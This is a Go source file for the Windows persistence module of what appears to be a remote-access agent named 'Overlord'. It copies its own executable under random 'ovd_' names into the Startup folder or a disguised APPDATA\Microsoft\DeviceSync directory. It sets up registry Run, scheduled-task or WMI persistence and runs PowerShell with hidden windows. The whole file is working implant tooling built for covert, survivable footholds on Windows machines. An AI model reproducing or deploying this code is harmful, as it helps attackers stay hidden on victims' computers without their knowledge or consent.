//go:build windows
// +build windows

package persistence

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

const (
	registryKey = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

	startupFolderRelative = `Microsoft\Windows\Start Menu\Programs\Startup`

	appDataBinaryDir = `Microsoft\DeviceSync`

	startupExecutablePrefix = "ovd_"
	taskNamePrefix          = "ovd_"

	legacyRegistryValueName = "OverlordAgent"
	registryValuePrefix     = "OverlordAgent-"

	createNoWindow = 0x08000000
)

func activeMethod() string {
	m := strings.ToLower(strings.TrimSpace(DefaultPersistenceMethod))
	switch m {
	case "registry", "taskscheduler", "wmi":
		return m
	default:
		return "startup"
	}
}

func getTargetPath() (string, error) {
	switch activeMethod() {
	case "registry", "taskscheduler", "wmi":
		return getAppDataTargetPath()
	default:
		return getStartupFolderTargetPath()
	}
}

func getStartupFolderTargetPath() (string, error) {
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", fmt.Errorf("APPDATA environment variable not set")
	}
	startupDir := filepath.Join(appDataDir, startupFolderRelative)
	if existing, ok := findExistingBinaryInDir(startupDir); ok {
		return existing, nil
	}
	name, err := generateBinaryName()
	if err != nil {
		return "", err
	}
	return filepath.Join(startupDir, name), nil
}

func getAppDataTargetPath() (string, error) {
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", fmt.Errorf("APPDATA environment variable not set")
	}
	dir := filepath.Join(appDataDir, appDataBinaryDir)
	if existing, ok := findExistingBinaryInDir(dir); ok {
		return existing, nil
	}
	name, err := generateBinaryName()
	if err != nil {
		return "", err
	}
	return filepath.Join(dir, name), nil
}

func getLegacyTargetPath() (string, bool) {
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", false
	}
	return filepath.Join(appDataDir, "Overlord", "agent.exe"), true
}

func findExistingBinaryInDir(dir string) (string, bool) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", false
	}
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := strings.ToLower(entry.Name())
		if strings.HasSuffix(name, ".exe") && strings.HasPrefix(name, startupExecutablePrefix) {
			return filepath.Join(dir, entry.Name()), true
		}
	}
	return "", false
}

func findExistingStartupExecutable(startupDir string) (string, bool) {
	return findExistingBinaryInDir(startupDir)
}

func generateBinaryName() (string, error) {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("failed to generate executable name: %w", err)
	}
	return startupExecutablePrefix + hex.EncodeToString(b) + ".exe", nil
}

func generateStartupExecutableName() (string, error) {
	return generateBinaryName()
}

func deriveTaskName(targetPath string) string {
	h := sha256.Sum256([]byte(strings.ToLower(filepath.Clean(targetPath))))
	return taskNamePrefix + hex.EncodeToString(h[:4])
}

func deriveWMINames(targetPath string) (filterName, consumerName string) {
	h := sha256.Sum256([]byte(strings.ToLower(filepath.Clean(targetPath))))
	suffix := hex.EncodeToString(h[:4])
	return taskNamePrefix + "f" + suffix, taskNamePrefix + "c" + suffix
}

func runPowerShell(script string) error {
	cmd := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: createNoWindow,
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("powershell: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

func install(exePath string) error {
	targetPath, err := getTargetPath()
	if err != nil {
		return err
	}

	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}

	if err := replaceExecutable(exePath, targetPath); err != nil {
		return err
	}

	if err := persistInstallFn(targetPath); err != nil {
		return fmt.Errorf("failed to install persistence: %w", err)
	}

	_ = cleanupLegacyRunValues()

	return nil
}

func replaceExecutable(exePath, targetPath string) error {
	srcFile, err := os.Open(exePath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dir := filepath.Dir(targetPath)
	tmpFile, err := os.CreateTemp(dir, "agent-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp executable: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer func() {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
	}()

	if _, err := io.Copy(tmpFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}
	if err := tmpFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync temp file: %w", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("failed to close temp file: %w", err)
	}

	if err := os.Rename(tmpPath, targetPath); err != nil {
		if removeErr := os.Remove(targetPath); removeErr == nil {
			if err = os.Rename(tmpPath, targetPath); err == nil {
				return nil
			}
		}
		return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
	}
	return nil
}

func configure(exePath string) error {
	targetPath, err := getTargetPath()
	if err != nil {
		return err
	}

	if exePath != "" && !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}

	if err := persistInstallFn(targetPath); err != nil {
		return fmt.Errorf("failed to reconfigure persistence: %w", err)
	}

	_ = cleanupLegacyRunValues()

	return nil
}

func uninstall() error {
	_ = cleanupLegacyRunValues()

	for _, fn := range persistUninstallFns {
		_ = fn()
	}

	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return nil
	}

	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, startupFolderRelative))
	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, appDataBinaryDir))
	_ = cleanupPrefixedExecutables(filepath.Join(appDataDir, "Overlord"))

	if legacyPath, ok := getLegacyTargetPath(); ok {
		_ = os.Remove(legacyPath)
	}

	return nil
}

func cleanupPrefixedExecutables(dir string) error {
	entries, err := os.ReadDir(dir)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return fmt.Errorf("failed to read startup cleanup directory %s: %w", dir, err)
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := strings.ToLower(entry.Name())
		if strings.HasPrefix(name, startupExecutablePrefix) {
			if err := os.Remove(filepath.Join(dir, entry.Name())); err != nil && !os.IsNotExist(err) {
				return fmt.Errorf("failed to remove startup artifact %s: %w", filepath.Join(dir, entry.Name()), err)
			}
		}
	}

	return nil
}

func cleanupLegacyRunValues() error {
	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey,
		registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		if err == registry.ErrNotExist {
			return nil
		}
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer k.Close()
	return cleanupOverlordRunValues(k)
}

func cleanupOverlordRunValues(k registry.Key) error {
	names, err := k.ReadValueNames(0)
	if err != nil {
		return err
	}
	for _, name := range names {
		if isOverlordRunValueName(name) {
			if err := k.DeleteValue(name); err != nil && err != registry.ErrNotExist {
				return err
			}
		}
	}
	return nil
}

func isOverlordRunValueName(name string) bool {
	if strings.EqualFold(name, legacyRegistryValueName) {
		return true
	}
	return strings.HasPrefix(strings.ToLower(name), strings.ToLower(registryValuePrefix))
}
